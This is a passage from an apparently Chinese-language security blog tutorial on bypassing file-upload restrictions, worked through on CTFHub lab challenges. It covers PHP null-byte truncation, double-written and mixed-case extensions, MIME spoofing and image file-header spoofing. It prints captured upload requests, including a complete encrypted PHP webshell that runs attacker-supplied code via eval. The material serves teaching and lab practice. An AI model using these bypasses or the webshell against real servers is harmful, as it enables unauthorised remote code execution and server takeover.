+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php7</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="利用中间件漏洞"><a href="#利用中间件漏洞" class="headerlink" title="利用中间件漏洞"></a>利用中间件漏洞</h2><blockquote>
+<p>中间件漏洞是指在计算机系统中使用的中间件软件中存在的安全漏洞。中间件是指位于操作系统和应用程序之间的软件组件，用于提供不同应用程序之间的通信和交互。常见的中间件包括数据库管理系统、Web服务器(如：<code>Apache</code>、<code>Nginx</code>)等。</p>
+</blockquote>
+<p>指路👉<a href="/posts/895d3c4b/">中间件漏洞</a></p>
+<h1 id="后端绕过-软件漏洞"><a href="#后端绕过-软件漏洞" class="headerlink" title="后端绕过-软件漏洞"></a>后端绕过-软件漏洞</h1><blockquote>
+<p>利用PHP某些版本的BUG可以做到一些意想不到的效果。例如，<code>00</code>截断</p>
+</blockquote>
+<h2 id="PHP-00截断绕过"><a href="#PHP-00截断绕过" class="headerlink" title="PHP 00截断绕过"></a>PHP 00截断绕过</h2><div class="tag-plugin link dis-select"><a class="link-card plain" title="感谢Diffany师傅提供的指导,https://gudiffany.github.io/" href="Diffany," cardlink autofill="icon"><div class="left"><span class="title">感谢Diffany师傅提供的指导,https://gudiffany.github.io/</span><span class="cap link footnote">https://wells.host/Diffany,</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<h3 id="00截断利用条件"><a href="#00截断利用条件" class="headerlink" title="00截断利用条件"></a>00截断利用条件</h3><ul>
+<li>php版本要小于5.3.4，5.3.4及以上已经修复该问题</li>
+<li>PHP的magic_quotes_gpc为OFF状态</li>
+<li>用户可指定上传路径</li>
+</ul>
+<h3 id="00绕过简介"><a href="#00绕过简介" class="headerlink" title="00绕过简介"></a>00绕过简介</h3><p>ASCII中0作为特殊字符保留，表示字符串结束。</p>
+<p>当用户传递文件<strong>上传路径包含</strong><code>00</code>，无论<code>00</code>后存在任何内容文本(或后端直接对<code>00</code>字符串进行拼接其他字符串)，<code>00</code>后的内容都会被截断，最后字符串留下<code>00</code>前的内容且<strong>不包括</strong><code>00</code>。</p>
+<p><strong>以GET方式举例：</strong></p>
+<p>ASCII中的<code>00</code>，无法直接显示，所以使用URL编码，ASCII中<code>00</code>经过url编码后变为<code>%00</code></p>
+<p>页面源码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>test.txt</code>的内容为</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &#x27;SUCCESS&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>test.txt%00.2.txt</code>的内容为</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &#x27;False&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>实验1</strong></p>
+<p>此时通过GET传递参数，<code>?file=test.txt%00.2.txt</code></p>
+<p><img src="/posts/931c692/image-20240310203142775.png" alt="image-20240310203142775"></p>
+<p>页面出现SUCCESS，说明<code>include</code>的文件是<code>test.txt</code>，此时<code>file</code>被解析为<code>test.txt</code></p>
+<p><strong>实验2：改变页面源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&#x27;.2.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时通过GET传递参数，<code>?file=test.txt%00</code></p>
+<p><img src="/posts/931c692/image-20240310203219223.png" alt="image-20240310203219223"></p>
+<p>页面还是出现SUCCESS，说明<code>include</code>的文件是<code>test.txt</code>，而不是<code>test.txt.2.txt</code>，此时变量<code>file</code>受<code>$_GET[&#39;file&#39;]</code>中的影响，一同被截断</p>
+<h3 id="00绕过方法"><a href="#00绕过方法" class="headerlink" title="00绕过方法"></a>00绕过方法</h3><h4 id="GET传参保存路径"><a href="#GET传参保存路径" class="headerlink" title="GET传参保存路径"></a>GET传参保存路径</h4><p>后端对文件路径的处理类似为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/对文件名的处理操作......&quot;</span> . <span class="variable">$ext</span>;</span><br></pre></td></tr></table></figure>
+
+<p>此时<code>road</code>为我们可控的参数，可直接进行使用<code>%00</code>截断</p>
+<p><img src="/posts/931c692/915b5ae1a067f5ffc307790bc7a964df.png" alt="915b5ae1a067f5ffc307790bc7a964df"></p>
+<p>由于使用<code>00</code>截断，所以最后文件保存在<code>/var/www/html/upload</code>,名为<code>shell.php</code>,根据位置，访问<code>/upload/shell.php</code>,即进入我们所在的页面，使用蚁剑连上后，可以找到我们成功截断的<code>shell.php</code></p>
+<p><img src="/posts/931c692/bf5ed62c6866f2d35525c1d4a5505f9b.png" alt="bf5ed62c6866f2d35525c1d4a5505f9b"></p>
+<h4 id="POST传参保存路径"><a href="#POST传参保存路径" class="headerlink" title="POST传参保存路径"></a>POST传参保存路径</h4><p>与GET传参类似的的是：后端对文件路径的处理类似为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$des</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/对文件名的处理操作......&quot;</span> . <span class="variable">$ext</span>;</span><br></pre></td></tr></table></figure>
+
+<p>此时<code>road</code>为我们可控的参数，但与GET传参不同的是，<strong>http请求内包含文件时，POST参数不再被自动解码</strong>，所以POST传参需要使用BP使用查看16进制的请求详情，修改一个十六进制的为<code>00</code></p>
+<p><img src="/posts/931c692/2688a4e300bf53dea64eb094b8d2ae55.png" alt="2688a4e300bf53dea64eb094b8d2ae55"></p>
+<p>步骤一：修改路径添加文件名，写入需要执行的代码语句</p>
+<p><img src="/posts/931c692/6e15d3a27f66fc4152400ddbecb2dbfb.png" alt="6e15d3a27f66fc4152400ddbecb2dbfb"></p>
+<p>步骤一：切换为十六进制模式，修改所需要替换为<code>00</code>的位置</p>
+<p><img src="/posts/931c692/2671bae349c3b99667fdab4ac7d326ea.png" alt="2671bae349c3b99667fdab4ac7d326ea"></p>
+<p>由于使用<code>00</code>截断，所以最后文件保存在<code>/var/www/html/upload</code>,名为<code>test.php</code>,根据位置，访问<code>/upload/test.php</code>,即进入我们所在的页面，可以看到PHP的配置信息，<code>00</code>截断成功</p>
+<p><img src="/posts/931c692/image-20240311000048915.png" alt="image-20240311000048915"></p>
+<h3 id="例题：-2"><a href="#例题：-2" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-00截断</strong></p>
+<p>查看页面源代码发现后端的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="variable">$info</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$des</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型不匹配&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>抓包，修改GET参数为<code>?road=/var/www/html/upload/shell.php%00</code>，使用<code>00</code>截断，在传入文件的内容替换成需要执行的代码，如一句话等</p>
+<p><img src="/posts/931c692/f78ac8eccde754e43869718de37e0d80.png" alt="f78ac8eccde754e43869718de37e0d80"></p>
+<p>然后使用蚁剑连接进入，可以看到我们是成功使用<code>00</code>截断写入的shell.php</p>
+<p><img src="/posts/931c692/image-20240310194757813.png" alt="image-20240310194757813"></p>
+<h1 id="后端检测-修改绕过"><a href="#后端检测-修改绕过" class="headerlink" title="后端检测-修改绕过"></a>后端检测-修改绕过</h1><blockquote>
+<p>通过抓包我们发送的请求，修改请求包中的部分内容，如修改文件名(黑名单双写，大小写替换)，MIME，添加文件头等等操作，使之上传的木马符合后端的要求，使之成功上传。</p>
+</blockquote>
+<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><h3 id="双写绕过原理"><a href="#双写绕过原理" class="headerlink" title="双写绕过原理"></a>双写绕过原理</h3><p>有时候在检测时，后台会把敏感字符删除，这个时候，可以使用双写进行绕过。比如：将<code>.php</code>改写为<code>.pphphp</code></p>
+<p>后端的代码类似为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$name</span>); <span class="comment">//str_ireplace() 函数替换字符串中的一些字符（不区分大小写）</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="例题：-3"><a href="#例题：-3" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-双写后缀</strong></p>
+<p>查看页面源码，发现这样一段内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);</span><br><span class="line">$name = str_ireplace($blacklist, &quot;&quot;, $name);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这时候上传<code>shell</code>文件，并抓包，将后缀名<code>.php</code>改写为<code>.pphphp</code>，再发包最后成功上传</p>
+<h2 id="大小写后缀绕过"><a href="#大小写后缀绕过" class="headerlink" title="大小写后缀绕过"></a>大小写后缀绕过</h2><h3 id="大小写后缀绕过-1"><a href="#大小写后缀绕过-1" class="headerlink" title="大小写后缀绕过"></a>大小写后缀绕过</h3><p>后端在检测时，后台会检测敏感字符，如果并没有不区分大小写时，可以使用大小写进行绕过。比如：将<code>.php</code>改写为<code>.pHp</code></p>
+<p>后端的代码类似为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\b(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$blacklist</span>) . <span class="string">&#x27;)\b/&#x27;</span>; <span class="comment">//区分大小写</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="MIME检测绕过"><a href="#MIME检测绕过" class="headerlink" title="MIME检测绕过"></a>MIME检测绕过</h2><h3 id="MIME简介"><a href="#MIME简介" class="headerlink" title="MIME简介"></a>MIME简介</h3><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL。部分Web应用系统判定文件类型是通过<code>content-type字段</code>，截取一个请求信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 930</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;echo.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;wells&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz--</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>Content-Type: application/octet-stream</code>和就是描述了上传文件的MIME 类型</p>
+<h3 id="MIME绕过方法"><a href="#MIME绕过方法" class="headerlink" title="MIME绕过方法"></a>MIME绕过方法</h3><p>部分Web应用系统判定文件类型是通过<code>content-type字段</code>，因此可以通过抓包，将<code>content-type字段</code>改为常见的<code>图片类型</code>，如<code>image/gif</code>，从而绕过校验。</p>
+<h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型:"></a>常见的MIME类型:</h3><p><code>text/plain</code> （纯文本）  <code>text/html</code> （HTML文档）  <code>text/javascript</code> （js代码）  <code>application/xhtml+xml</code> （XHTML文档）  <code>image/gif</code> （GIF图像）  <code>image/jpeg</code> （JPEG图像）  <code>image/png</code> （PNG图像）  <code>video/mpeg</code> （MPEG动画）  <code>application/octet-stream</code> （二进制数据）  <code>application/pdf</code> （PDF文档）</p>
+<h3 id="例题：-4"><a href="#例题：-4" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-MIME绕过</strong></p>
+<p>尝试直接上传<code>.htaccess</code>和<code>php</code>shell文件时都上传失败，尝试修改MIME类型，抓包原始请求头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 930</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">    $key=&quot;7dad18e6e49e447a&quot;;</span><br><span class="line">	$_SESSION[&#x27;k&#x27;]=$key;</span><br><span class="line">	session_write_close();</span><br><span class="line">	$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">	if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">		$post=$t($post.&quot;&quot;);</span><br><span class="line">		</span><br><span class="line">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">	class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz--</span><br></pre></td></tr></table></figure>
+
+<p>将</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary4BffHh31AMlHQtBd</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br></pre></td></tr></table></figure>
+
+<p>修改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary4BffHh31AMlHQtBd</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br></pre></td></tr></table></figure>
+
+<p>再放行，最后发现<code>shell.php</code>被成功上传，访问<code>upload/shell.php</code>，无内容显示，说明<code>.txt</code>文件被作为php脚本执行成功，使用冰蝎连接</p>
+<p><img src="/posts/931c692/image-20240305205615030.png" alt="image-20240305205615030"></p>
+<p>成功获取<code>phpinfo</code>页面，连接成功，读取flag</p>
+<h2 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h2><h3 id="文件头检测绕过简介"><a href="#文件头检测绕过简介" class="headerlink" title="文件头检测绕过简介"></a>文件头检测绕过简介</h3><p>文件头是在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）的一段数据，用于描述文件的属性和格式信息， 在进行<strong>文件头绕过</strong>时，我们可以把图片的<strong>文件头</strong>添加到我们的木马内容最前面，达到绕过文件头检测的目的。</p>
+<h3 id="常见的文件头"><a href="#常见的文件头" class="headerlink" title="常见的文件头"></a>常见的文件头</h3><p><strong>注意：文本形式请点击复制，不要做任何修改</strong></p>
+<p> GIF：</p>
+<p>16进制模式：<code>47 49 46 38 39 61</code></p>
+<p>对应文本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<p> png：</p>
+<p>16进制模式：<code>89 50 4E 47 0D 0A 1A 0A</code> </p>
+<p>对应文本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‰PNG</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>JPG：</p>
+<p>16进制模式：<code>FF D8 FF E0 00 10 4A 46 49 46 </code>   </p>
+<p>对应文本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ÿØÿà</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件头检测绕过条件"><a href="#文件头检测绕过条件" class="headerlink" title="文件头检测绕过条件"></a>文件头检测绕过条件</h3><ul>
+<li>某些情况下，后端可能还会检测文件拓展名，此时需要结合<strong>解析漏洞</strong>或者<strong>文件包含</strong>才能实现执行木马</li>
+</ul>
+<h3 id="例题：-5"><a href="#例题：-5" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-文件头检查</strong></p>
+<p>步骤一：直接选择木马文件进行上传，然后进行抓包</p>
+<p><img src="/posts/931c692/image-20240311194544976.png" alt="image-20240311194544976"></p>
+<p><img src="/posts/931c692/image-20240311194902164.png" alt="image-20240311194902164"></p>
+<p><strong>以添加PNG请求头为例</strong></p>
+<p>方法一：在PHP代码前添加入任意八个字母，用于定位以及替换为PNG的文件头，后转HEX模式替换为PNG的文件头</p>
+<p><img src="/posts/931c692/75033ba79ccf8f01e779c986126eab6d.png" alt="75033ba79ccf8f01e779c986126eab6d"></p>
+<p>方法二：直接在PHP代码后插入PNG文件头对应的文本表示符号</p>
+<p><img src="/posts/931c692/d27ef6d3293e7bd2c81eb69580af1915.png" alt="d27ef6d3293e7bd2c81eb69580af1915"></p>
+</article>
+<div class="article-footer">
+    <section id="references">
+      <div class="header"><span>参考资料</span></div>
+      <div class="body">
+        <ul>
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1938541">超详细文件上传漏洞总结分析-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
